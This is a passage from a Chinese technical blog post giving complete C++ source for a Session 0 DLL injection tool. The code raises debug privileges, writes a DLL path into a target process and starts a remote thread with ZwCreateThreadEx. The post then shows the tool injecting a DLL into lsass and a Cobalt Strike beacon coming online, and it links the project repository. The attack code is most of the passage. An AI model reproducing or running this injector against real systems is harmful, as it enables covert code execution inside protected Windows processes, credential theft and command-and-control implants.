class="line"></span><br><span class="line">		<span class="comment">// 获取“Debug Programs”特权的本地唯一标识符（LUID）</span></span><br><span class="line">		<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 设置特权的属性为启用</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 调整访问令牌，启用“Debug Programs”特权</span></span><br><span class="line">		<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS); <span class="comment">// 检查是否成功启用特权</span></span><br><span class="line">		<span class="built_in">CloseHandle</span>(hToken); <span class="comment">// 关闭访问令牌的句柄</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk; <span class="comment">// 返回函数是否执行成功的状态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Session0Inject</span><span class="params">(DWORD pid, <span class="type">char</span>* dllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">EnableDebugPrivilege</span>();  <span class="comment">//提权</span></span><br><span class="line">	DWORD DllNameLength = <span class="built_in">strlen</span>(dllPath);  <span class="comment">//获取dll路径名的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查文件是否存在  注意:&lt;filesystem&gt;库需使用支持C++17或更高版本的编译器</span></span><br><span class="line">	<span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(dllPath)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;指定的DLL文件不存在\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1 获取目的进程句柄</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开进程失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 为目的进程分配内存,用于存放Loadlibrary传入的参数,即dll的路径</span></span><br><span class="line">	VOID* paraAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, DllNameLength + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == paraAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3 将DLL的路径写到目标进程的内存</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, paraAddr, dllPath, DllNameLength + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入内存失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4 获取loadlibrary函数的地址</span></span><br><span class="line">	HMODULE LibHandle = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	FARPROC ProcAdd = <span class="built_in">GetProcAddress</span>(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ProcAdd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取LoadLibraryA失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5 通过调用GetProcAddress函数来获取ZwCreateThreadEx函数的地址</span></span><br><span class="line">	HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	DWORD dwStatus;</span><br><span class="line">	HANDLE hRemoteThread; </span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6 使用获取到的ZwCreateThreadEx函数在目标进程中创建线程，运行LoadLibraryA函数，参数为DLL路径</span></span><br><span class="line">	dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放dll</span></span><br><span class="line">	<span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="comment">//atoi函数可将字符串转化为整数</span></span><br><span class="line">		BOOL bRet = <span class="built_in">Session0Inject</span>((DWORD)<span class="built_in">atoi</span>(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">-1</span> == bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll failed\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll successfully\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;你需输入两个参数,参数1为pid,参数2为dll的绝对路径\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h1><p>首先获取lsass进程的PID，此处为696</p>
<img src="session0注入/image-20230611233900720.png" alt="image-20230611233900720" style="zoom:67%;" />	



<p>以管理员权限运行cmd，使用session0注入将dll注入至lsass进程中</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611233625460.png" alt="image-20230611233625460">			</p>
<p>Cobalt Strike成功上线</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611234019447.png" alt="image-20230611234019447"></p>
<p>在火绒剑可以看到lsass进程注入的dll</p>
<img src="session0注入/image-20230611234104530.png" alt="image-20230611234104530" style="zoom: 50%;" />	

<p>​			</p>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a target="_blank" rel="noopener" href="https://github.com/xf555er/Session0_Inject">https://github.com/xf555er/Session0_Inject</a></p>
<p>​	</p>
<p>​	</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Xiao Ni"
      src="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
  <p class="site-author-name" itemprop="name">Xiao Ni</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Xiao Ni</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

#running-time

<script>
    $(document).ready(function () {

        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
        var pvcountOffset = 80000;  // 初始化首次数据
        var uvcountOffset = 20000;

        function fixCount() {
            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
                clearInterval(int);
            }
            if ($("#busuanzi_container_site_pv").css("display") != "none") {
                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
                clearInterval(int); // 停止检测
            }
        }
    });
</script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>